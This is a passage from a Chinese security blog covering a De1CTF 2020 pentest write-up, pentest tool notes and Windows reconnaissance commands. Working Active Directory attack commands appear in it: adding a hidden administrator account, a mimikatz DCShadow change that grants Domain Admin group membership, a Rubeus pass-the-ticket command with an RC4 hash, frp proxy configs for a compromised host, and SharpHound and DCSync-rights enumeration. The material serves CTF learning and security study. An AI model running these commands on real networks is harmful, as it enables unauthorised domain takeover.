<li>Windows 8.1和Windows Server 2012 R2默认支持该功能</li>
<li>Windows 7和Windows Server 2008 R2默认不支持，需要安装补丁2871997、2973351</li>
</ul>
</blockquote>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509201856781.png" alt="image-20200509201856781"></p>
<p>远程桌面打不开，然后新建一个用户，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net user username password /add #添加用户</span><br><span class="line">net user 123 123 /add</span><br><span class="line">net user username #查看用户的详情</span><br><span class="line">net user 123</span><br><span class="line">net localgroup group username /add #将用户添加到group中</span><br><span class="line">net localgroup administrators 123 /add</span><br></pre></td></tr></table></figure>

<p>然后mstsc.exe，直接输入账号密码连接，第一次拿到别人的远程桌面，，，，，，，，，，</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509203945376.png" alt="image-20200509203945376"></p>
<p>然后就是DCShadow，以管理员打开一个mimikatz.exe，然后输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!+</span><br><span class="line">!processtoken</span><br><span class="line">lsadump::dcshadow &#x2F;object:CN&#x3D;De1ta,CN&#x3D;Users,DC&#x3D;De1CTF2020,DC&#x3D;lab &#x2F;attribute:primaryGroupID &#x2F;value:512</span><br></pre></td></tr></table></figure>

<p>然后在以de1ta用户的身份，push推送，试了半天就是没成功。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgt &#x2F;user:de1ta &#x2F;rc4:B03094996601324646AC223BF30D0D07 &#x2F;domain:de1ctf2020.lab &#x2F;ptt &amp;&amp; mimikatz.exe &quot;lsadump::dcshadow &#x2F;push&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<p>然后在Coblt Strike中也没成功，，，，，，，，</p>
<p>报错如下</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509225941467.png" alt="image-20200509225941467"></p>
<p>查了报错也都是说是因为第一步没有用system权限打开mimikatz,exe，是用system打开的啊。😵😵😵</p>
<p>参考</p>
<p><a href="https://mp.weixin.qq.com/s/1CR0up_b5a1zw02wZNwJpg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/1CR0up_b5a1zw02wZNwJpg</a></p>
<p><a href="https://byqiyou.github.io/2020/05/06/De1CTF2020/#Hard-Pentest" target="_blank" rel="noopener">https://byqiyou.github.io/2020/05/06/De1CTF2020/#Hard-Pentest</a></p>
<p>[<a href="https://xz.aliyun.com/t/7454]" target="_blank" rel="noopener">https://xz.aliyun.com/t/7454]</a>(</p>
]]></content>
      <tags>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透工具使用</title>
    <url>/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>记录一些渗透工具的使用，持续更新</p>
<a id="more"></a>

<h2 id="1-利用adfind-过滤-ACL"><a href="#1-利用adfind-过滤-ACL" class="headerlink" title="1. 利用adfind 过滤 ACL"></a><strong>1. 利用adfind 过滤 ACL</strong></h2><p>如果想用adfind 过滤ACL的话，我们可以使用<code>-sddlfilter</code>,语法如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-sddlfilter ;;;;;</span><br></pre></td></tr></table></figure>

<p>后面跟的参数对应的是ace条目相应的参数，值得注意的是，过滤的格式跟输出的格式要保持一致。</p>
<p>如果<code>-rawsddl</code> ，最后一个参数是sid，这个时候用<code>-sddlfilter</code>进行过滤，最后一个参数就要用sid的形式。</p>
<p>如果是<code>-sddl+++</code>，最后一个参数已经解析后账号名，这个时候用<code>-sddlfilter</code>进行过滤，最后一个参数就要用账号名的形式。</p>
<p>下面举几个例子</p>
<ol>
<li><p>查找某个对象在域内的ACL权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -s subtree -b &quot;DC&#x3D;test,DC&#x3D;local&quot; nTSecurityDescriptor   -sddl+++   -sddlfilter ;;;;;&quot;TEST\DC2016$&quot;   -recmute</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/t01820587bbe037011c.png" alt="img"></p>
<ol>
<li>查找更改一个对象的马上到！S-AllowedToActOnBehalfOfOtherIdentity的权限</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -s subtree -b &quot;DC&#x3D;test,DC&#x3D;local&quot; nTSecurityDescriptor   -sddl++   -sddlfilter ;;;&quot;msDS-AllowedToActOnBehalfOfOtherIdentity&quot;;;  -recmute</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/t01c5d2427249c7cca8.png" alt="img"></p>
<ol>
<li>查找域内具备dcync 权限的用户</li>
</ol>
<p>对域对象只需要具备一下这两个权限，就有dcsync的权限。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;DS-Replication-Get-Changes&#39;     &#x3D; 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</span><br><span class="line">&#39;DS-Replication-Get-Changes-All&#39; &#x3D; 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/t0190b4f7118459c867.png" alt="img"></p>
<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/t01783c2e12d6384581.png" alt="img"></p>
<p>开始进行搜索</p>
<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/t011c3a109eabb651d5.png" alt="img"></p>
<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/t015d193bee48b235f1.png" alt="img"></p>
<h1 id="2-frp-内网代理"><a href="#2-frp-内网代理" class="headerlink" title="2 frp 内网代理"></a>2 frp 内网代理</h1><p>frps 运行在具有公网IP地址的VPS上</p>
<p>frpc 运行在我们得到shell权限的肉鸡上</p>
<p>frps  配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr &#x3D; 0.0.0.0</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line"># IP 与 bind_addr 默认相同，可以不设置</span><br><span class="line"># dashboard_addr &#x3D; 0.0.0.0</span><br><span class="line"># 端口必须设置，只有设置web页面才生效</span><br><span class="line">dashboard_port &#x3D; 7500</span><br><span class="line"># 用户密码保平安</span><br><span class="line">dashboard_user &#x3D; aaaa</span><br><span class="line">dashboard_pwd &#x3D; bbbb</span><br><span class="line"></span><br><span class="line"># 允许客户端绑定的端口</span><br><span class="line">allow_ports &#x3D; 40000-50000</span><br></pre></td></tr></table></figure>

<p>frpc 配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"># 远程VPS地址</span><br><span class="line">server_addr &#x3D; xxx.xx.xx.xx</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line">pool_count &#x3D; 5</span><br><span class="line"></span><br><span class="line">[plugin_socks5]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 44444</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">plugin_user &#x3D; abc</span><br><span class="line">plugin_passwd &#x3D; abc</span><br></pre></td></tr></table></figure>

<p>客户端运行</p>
<img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200506151014647.png" alt="image-20200506151014647" style="zoom:200%;">

<p>上图客户端为win2012R2</p>
<p>服务端运行</p>
<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200509191519398.png" alt="image-20200509191519398"></p>
<p>上面第三行表示已经建立代理</p>
<p>之后在本地用proxifier就可以代理访问内网资源</p>
<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200506151223032.png" alt="image-20200506151223032"></p>
<h1 id="3-BloodHound"><a href="#3-BloodHound" class="headerlink" title="3.BloodHound"></a>3.BloodHound</h1><p><a href="https://github.com/BloodHoundAD/BloodHound/wiki" target="_blank" rel="noopener">项目地址</a></p>
<p>需要java环境，安装neo4j数据库，我是选择在kali虚拟机安装neo4j数据库，然后再主机win10使用bloodhound,要修改kali里的数据库配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dbms.default_listen_address&#x3D;0.0.0.0</span><br><span class="line">dbms.default_advertised_address&#x3D;0.0.0.0</span><br><span class="line">dbms.connector.bolt.listen_address&#x3D;0.0.0.0:7687</span><br><span class="line">dbms.connector.http.listen_address&#x3D;0.0.0.0:7474</span><br></pre></td></tr></table></figure>

<p>win直接安装 <a href="https://github.com/BloodHoundAD/BloodHound/releases" target="_blank" rel="noopener">bloodhound</a></p>
<p>配套使用<a href="https://github.com/BloodHoundAD/SharpHound" target="_blank" rel="noopener">SharpHound.exe</a>，在目标主机运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SharpHound.exe -c all</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200509161842148.png" alt="image-20200509161842148"></p>
<p>然后下载zip，把json文件拖进bloodhound</p>
<ul>
<li>database info </li>
</ul>
<img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200509162917174.png" alt="image-20200509162917174" style="zoom:150%;">

<ul>
<li>nodeinfo</li>
</ul>
<img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200509163204823.png" alt="image-20200509163204823" style="zoom:150%;">

<ul>
<li>queries</li>
</ul>
<p>对应下面</p>
<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200509164243314.png" alt="image-20200509164243314"></p>
<h4 id="示例：Shortest-Paths-from-Kerberoastable-Users"><a href="#示例：Shortest-Paths-from-Kerberoastable-Users" class="headerlink" title="示例：Shortest Paths from Kerberoastable Users"></a>示例：Shortest Paths from Kerberoastable Users</h4><p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200509165304258.png" alt="image-20200509165304258"></p>
<p>如果一个用户是Kerberoastable，可以通过Kerberoasting的到hash，然后可以爆破密码。</p>
<p>ps:注册spn的服务账号都是Kerberoastable的。</p>
<p>ps:右键路径可以得到相关滥用信息以及参考，如上面这个在Abuse里提供了基于资源的约束委派利用方法。</p>
<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200509165843365.png" alt="image-20200509165843365"></p>
<h1 id="4-cobalt-strike"><a href="#4-cobalt-strike" class="headerlink" title="4 cobalt strike"></a>4 cobalt strike</h1><p>执行powermad或powerpiew，用powershell-import,然后再用powerpick  XXX.</p>
<p>sleep 0 速度会快，但是实战中流量会大。</p>
<p>参考</p>
<p><a href="https://xz.aliyun.com/t/7311" target="_blank" rel="noopener">https://xz.aliyun.com/t/7311</a></p>
<p><a href="https://daiker.gitbook.io/windows-protocol/ldap-pian/12#0x02-acl" target="_blank" rel="noopener">https://daiker.gitbook.io/windows-protocol/ldap-pian/12#0x02-acl</a></p>
]]></content>
      <tags>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透信息收集</title>
    <url>/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>de1tactf遇到了渗透题，记录下信息收集的命令，</p>
<a id="more"></a>

<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="windows常用用户"><a href="#windows常用用户" class="headerlink" title="windows常用用户"></a>windows常用用户</h2><blockquote>
<ul>
<li>SYSTEM：本地机器上拥有最高权限的用户。</li>
<li>Administrator：本地机器上拥有最高权限的用户。</li>
<li>Guest：只拥有相对较少的权限，默认被禁用。</li>
</ul>
</blockquote>
<h2 id="windows常见用户组"><a href="#windows常见用户组" class="headerlink" title="windows常见用户组"></a>windows常见用户组</h2><blockquote>
<p>Administrators,管理员组，默认情况下，Administrators中的用户对计算机/域有不受限制的完全访问权。分配给该组的默认权限允许对整个系统进行完全控制。所以，只有受信任的人员才可成为该组的成员。</p>
<p>Power Users，高级用户组，Power Users 可以执行除了为 Administrators 组保留的任务外的其他任何操作系统任务。分配给 Power Users 组的默认权限允许 Power Users 组的成员修改整个计算机的设置。但Power Users 不具有将自己添加到 Administrators 组的权限。在权限设置中，这个组的权限是仅次于Administrators的。</p>
<p>Users:普通用户组，这个组的用户无法进行有意或无意的改动。因此，用户可以运行经过验证的应用程序，但不可以运行大多数旧版应用程序。Users 组是最安全的组，因为分配给该组的默认权限不允许成员修改操作系统的设置或用户资料。Users 组提供了一个最安全的程序运行环境。在经过 NTFS 格式化的卷上，默认安全设置旨在禁止该组的成员危及操作系统和已安装程序的完整性。用户不能修改系统注册表设置、操作系统文件或程序文件。Users 可以关闭工作站，但不能关闭服务器。Users 可以创建本地组，但只能修改自己创建的本地组。</p>
<p>Guests:来宾组，按默认值，来宾跟普通Users的成员有同等访问权，但来宾帐户的限制更多。</p>
<p>Everyone:顾名思义，所有的用户，这个计算机上的所有用户都属于这个组。</p>
</blockquote>
<h2 id="windows-文件夹权限"><a href="#windows-文件夹权限" class="headerlink" title="windows 文件夹权限"></a>windows 文件夹权限</h2><blockquote>
<p>①完全控制（Full Control）： 该权限允许用户对文件夹、子文件夹、文件进行全权控制，如修改资源的权限、获取资源的所有者、删除资源的权限等，拥有完全控制权限就等于拥有了其他所有的权限；</p>
<p>②修改（Modify）： 该权限允许用户修改或删除资源，同时让用户拥有写入及读取和运行权限；</p>
<p>③读取和运行（Read &amp; Execute）： 该权限允许用户拥有读取和列出资源目录的权限，另外也允许用户在资源中进行移动和遍历，这使得用户能够直接访问子文件夹与文件，即使用户没有权限访问这个路径；</p>
<p>④列出文件夹目录（List Folder Contents）： 该权限允许用户查看资源中的子文件夹与文件名称；</p>
<p>⑤读取（Read）： 该权限允许用户查看该文件夹中的文件以及子文件夹，也允许查看该文件夹的属性、所有者和拥有的权限等；</p>
<p>⑥写入（Write）： 该权限允许用户在该文件夹中创建新的文件和子文件夹，也可以改变文件夹的属性、查看文件夹的所有者和权限等。</p>
</blockquote>
<p><a href="https://paper.seebug.org/17/" target="_blank" rel="noopener">https://paper.seebug.org/17/</a></p>
<h1 id="net-系列命令"><a href="#net-系列命令" class="headerlink" title="net 系列命令"></a>net 系列命令</h1><h2 id="net-use"><a href="#net-use" class="headerlink" title="net use"></a>net use</h2><blockquote>
<p>Connects a computer to or disconnects a computer from a shared resource, or displays information about computer connections. The command also controls persistent net connections. Used without parameters, <strong>net use</strong> retrieves a list of network connections.</p>
<p>将计算机连接到共享资源或将其与共享资源断开连接，或显示有关计算机连接的信息。 该命令还控制持久的网络连接。 如果不带参数使用，net use会检索网络连接列表。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">net use [&#123;&lt;DeviceName&gt; | *&#125;] [\\&lt;ComputerName&gt;\&lt;ShareName&gt;[\&lt;volume&gt;]] [&#123;&lt;Password&gt; | *&#125;]] [/user:[&lt;DomainName&gt;\]&lt;UserName] &gt;[/user:[&lt;DottedDomainName&gt;\]&lt;UserName&gt;] [/user: [&lt;UserName@DottedDomainName&gt;] [/savecred] [/smartcard] [&#123;/<span class="keyword">delete</span> | /persistent:&#123;yes | no&#125;&#125;]</span><br><span class="line">net use [&lt;DeviceName&gt; [/<span class="built_in">home</span>[&#123;&lt;Password&gt; | *&#125;] [/<span class="keyword">delete</span>:&#123;yes | no&#125;]]</span><br><span class="line">net use [/persistent:&#123;yes | no&#125;]</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">要将磁盘驱动器设备名称E：分配给\\Financial服务器上的Letters共享目录，请键入：</span><br><span class="line">net use e: \\financial\letters</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">要将磁盘驱动器设备名称M：分配（映射）到\\Financial服务器上的Letters卷中的目录User2，请键入：</span><br><span class="line">net use e: \\financial\letters</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">要连接用户标识符User1，就像从帐户域中建立连接一样，请键入</span><br><span class="line">net use d:\\server\share &#x2F;user:Accounts\User1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">要从\\Financial\Public目录断开连接，请键入：</span><br><span class="line">net use f: \\financial\public &#x2F;delete</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">要连接到\\Financial 2服务器上共享的资源备忘录，请键入：</span><br><span class="line">net use k: &quot;\\financial 2&quot; \memos</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">要恢复每次登录时的当前连接，而不考虑将来的更改，请键入：</span><br><span class="line">net use &#x2F;persistent:yes</span><br></pre></td></tr></table></figure>

<h2 id="net-view"><a href="#net-view" class="headerlink" title="net view"></a>net view</h2><blockquote>
<p>Displays a list of domains, computers, or resources that are being shared by the specified computer. Used without parameters, <strong>net view</strong> displays a list of computers in your current domain.</p>
<p>显示指定计算机正在共享的域、计算机或资源的列表。在没有参数的情况下使用，net view将显示当前域中的计算机列表。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">net view [\\ComputerName [/CACHE] | [/ALL] | /DOMAIN[:DomainName]]</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Use the net view command to display a list of computers. The output is similar to the following:</span><br><span class="line"></span><br><span class="line">Server Name           Remark</span><br><span class="line">-------------------------------------------------</span><br><span class="line">\\Production          Production file server</span><br><span class="line">\\Print1              Printer room, first floor</span><br><span class="line">\\Print2              Printer room, second floor</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">To see a list of the resources shared by the \\Production computer, type:</span><br><span class="line">net view \\production</span><br><span class="line"></span><br><span class="line">To see a list of the computers in the sales domain or workgroup, type:</span><br><span class="line">net view &#x2F;domain:sales</span><br></pre></td></tr></table></figure>

<h2 id="net-user"><a href="#net-user" class="headerlink" title="net user"></a>net user</h2><blockquote>
<p>Adds or modifies user accounts, or displays user account information.</p>
<p><strong>Net user</strong> is a command-line tool that is built into Windows Vista. To run <strong>net user</strong>, open a command prompt, type <strong>net user</strong> with the appropriate parameters, and then press ENTER.</p>
<p>添加或修改用户帐户，或显示用户帐户信息。</p>
<p><strong>Net user</strong>是Windows Vista中内置的命令行工具。 若要运行net user，请打开命令提示符，键入具有适当参数的net user，然后按Enter。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">net user [&lt;UserName&gt; &#123;&lt;Password&gt; | *&#125; [&lt;Options&gt;]] [/domain]</span><br><span class="line">net user [&lt;UserName&gt; &#123;&lt;Password&gt; | *&#125; /add [&lt;Options&gt;] [/domain]]</span><br><span class="line">net user [&lt;UserName&gt; [/<span class="keyword">delete</span>] [/domain]]</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下面的示例显示本地计算机的所有用户帐户的列表：</span><br><span class="line">net user</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">以下示例显示有关用户帐户tommyh的信息：</span><br><span class="line">net user tommyh</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">以下示例为全名是Jay Jamison，用户帐户名是jayj的用户添加了一个用户帐户，其登录权限为上午8点。周一至周五下午5点（时间指定中没有空格），强制性密码（Cyk4^g3B）和用户的全名：</span><br><span class="line">net user jayj Cyk4^g3B &#x2F;add &#x2F;passwordreq:yes &#x2F;times:monday-friday,8am-5pm &#x2F;fullname:&quot;Jay Jamison&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下面的示例使用24小时表示法设置用于登录的登录时间（上午8点到下午5点）：</span><br><span class="line">net user miked &#x2F;time:M-F,8AM-5PM</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下面的示例指定了登录时间:周一从上午4点到下午5点，周二从下午1点到下午3点，周三到周五从上午8点到下午5点</span><br><span class="line">net user anibals &#x2F;time:M,4AM-5PM;T,1PM-3PM;W-F,8:00-17:00</span><br></pre></td></tr></table></figure>

<h2 id="net-share"><a href="#net-share" class="headerlink" title="net share"></a>net share</h2><blockquote>
<p>Manages shared resources. Used without parameters, <strong>net share</strong> displays information about all of the resources that are shared on the local computer. For each resource, the device name(s) or pathname(s) and a descriptive comment are displayed.</p>
<p>管理共享资源。 使用不带参数的net share可以显示有关在本地计算机上共享的所有资源的信息。 对于每个资源，将显示设备名称或路径名称以及描述性注释。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net share &lt;ShareName&gt;</span><br><span class="line">net share &lt;ShareName&gt;&#x3D;&lt;drive&gt;:&lt;DirectoryPath&gt; [&#x2F;grant:&lt;user&gt;,&#123;read | change |full&#125;] [&#x2F;users:&lt;number&gt; | &#x2F;unlimited] [&#x2F;remark:&lt;text&gt;] [&#x2F;cache:&#123;manual | documents | programs | BranchCache |none&#125; ]</span><br><span class="line">net share [&#x2F;users:&lt;number&gt; | &#x2F;unlimited] [&#x2F;remark:&lt;text&gt;] [&#x2F;cache:&#123;manual | documents | programs | BranchCache |none&#125; ]</span><br><span class="line">net share &#123;&lt;ShareName&gt; | &lt;DeviceName&gt; | &lt;drive&gt;:&lt;DirectoryPath&gt;&#125; &#x2F;delete</span><br><span class="line">net share &lt;ShareName&gt; \\&lt;ComputerName&gt; &#x2F;delete</span><br></pre></td></tr></table></figure>

<h2 id="net-localgroup"><a href="#net-localgroup" class="headerlink" title="net localgroup"></a>net localgroup</h2><blockquote>
<p>Adds, displays, or modifies local groups. Used without parameters, <strong>net localgroup</strong> displays the name of the server and the names of local groups on the computer.</p>
<p>添加，显示或修改本地组。 使用不带参数的net localgroup可以显示服务器的名称和计算机上的本地组的名称。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net localgroup [&lt;GroupName&gt; [&#x2F;comment:&quot;&lt;Text&gt;&quot;]] [&#x2F;domain]</span><br><span class="line">net localgroup [&lt;GroupName&gt; &#123;&#x2F;add [&#x2F;comment:&quot;&lt;Text&gt;&quot;] | &#x2F;delete&#125; [&#x2F;domain]</span><br><span class="line">net localgroup [&lt;GroupName&gt; &lt;Name&gt; […] &#123;&#x2F;add |  &#x2F;delete&#125; [&#x2F;domain]</span><br></pre></td></tr></table></figure>

<p>res</p>
<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012</a></p>
<blockquote>
<p>以下参考</p>
<p><a href="https://xz.aliyun.com/t/7663" target="_blank" rel="noopener">https://xz.aliyun.com/t/7663</a></p>
<p><a href="https://wh0ale.github.io/2018/12/19/2018-12-19-域渗透/" target="_blank" rel="noopener">https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/</a></p>
<p><a href="https://www.cnblogs.com/leixiao-/p/10578809.html环境搭建介绍的较全面" target="_blank" rel="noopener">https://www.cnblogs.com/leixiao-/p/10578809.html环境搭建介绍的较全面</a></p>
</blockquote>
<h1 id="内网渗透信息收集"><a href="#内网渗透信息收集" class="headerlink" title="内网渗透信息收集"></a>内网渗透信息收集</h1><blockquote>
<h1 id="内网和域"><a href="#内网和域" class="headerlink" title="内网和域"></a>内网和域</h1><h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><p>局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。</p>
<h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p>域（Domain）是相对工作组（Workgroup）的概念，形象的说，域就像中央集权，由一台或数台域控制器（Domain Controller）管理域内的其他计算机；工作组就像各自为政，组内每一台计算机自己管理自己，他人无法干涉。</p>
<p>域是一个计算机群体的组合，是一个相对严格的组织，而域控制器则是这个域内的管理核心。</p>
<p>域控制器可以对域内计算机进行集中管理，比如在域控制器上可以定义所有用户不能更改桌面，或者所有用户的密码长度必须8位以上，而工作组环境的计算机则无法做到这些。</p>
<p>一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP/IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题。</p>
<ul>
<li>域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后， 2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。 　　 – 域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域;每个域都有自己的安全策略，以及它与其他域的安全信任关系。 – 域：域是一种管理边界，用于一组计算机共享共用的安全数据库，域实际上就是一组服务器和工作站的集合。</li>
</ul>
<blockquote>
<p>域和域之间可以通过VPN等设备进行连接，并建立从属和平行的域关系</p>
</blockquote>
<h2 id="域、工作组、家庭组"><a href="#域、工作组、家庭组" class="headerlink" title="域、工作组、家庭组"></a>域、工作组、家庭组</h2><p><strong>工作组:</strong></p>
<ul>
<li>所有的计算机都是对等的，没有计算机可以控制另一台计算机。每台计算机都具有一组用户帐户。若要登录到工作组中的任何计算机，您必须具有该计算机上的帐户。</li>
<li>通常情况下，计算机的数量不超过二十台。</li>
<li>工作组不受密码保护。</li>
<li>所有的计算机必须在同一本地网络或子网中。</li>
</ul>
<p><strong>家庭组：</strong></p>
<ul>
<li>家庭网络中的计算机必须属于某个工作组，但它们也可以属于某个家庭组。使用家庭组，可轻松与家庭网络中的其他人共享图片、音乐、视频、文档和打印机。</li>
<li>家庭组受密码保护，但在将计算机添加到家庭组时，只需要键入一次密码即可。</li>
</ul>
<p><strong>域：</strong></p>
<ul>
<li>有一台或多台计算机为服务器。网络管理员使用服务器控制域中所有计算机的安全和权限。这使得更容易进行更改，因为更改会自动应用到所有的计算机。域用户在每次访问域时必须提供密码或其他凭据。</li>
<li>如果具有域上的用户帐户，您就可以登录到域中的任何计算机，而无需具有该计算机上的帐户。 由于网络管理员经常要确保计算机之间的一致性，所以，您也许只能对计算机的设置进行有限制地更改。</li>
<li>一个域中可以有几千台计算机。</li>
<li>计算机可以位于不同的本地网络中。</li>
</ul>
</blockquote>
<h2 id="系统环境变量"><a href="#系统环境变量" class="headerlink" title="系统环境变量"></a>系统环境变量</h2><ul>
<li>set</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505134836878.png" alt="image-20200505134836878"></p>
<h2 id="本机网络配置"><a href="#本机网络配置" class="headerlink" title="本机网络配置"></a>本机网络配置</h2><ul>
<li>ipconfig /all</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505084641489.png" alt="image-20200505084641489"></p>
<h2 id="操作系统版本信息、补丁信息等"><a href="#操作系统版本信息、补丁信息等" class="headerlink" title="操作系统版本信息、补丁信息等"></a>操作系统版本信息、补丁信息等</h2><ul>
<li>systeminfo</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505084846446.png" alt="image-20200505084846446"></p>
<h2 id="查询系统体系架构"><a href="#查询系统体系架构" class="headerlink" title="查询系统体系架构"></a>查询系统体系架构</h2><ul>
<li>echo %PROCESSOR_ARCHITECTURE%</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505085233818.png" alt="image-20200505085233818" style="zoom:200%;">

<h2 id="查询已安装的软件及版本信息"><a href="#查询已安装的软件及版本信息" class="headerlink" title="查询已安装的软件及版本信息"></a>查询已安装的软件及版本信息</h2><ul>
<li>wmic product get name,version</li>
</ul>
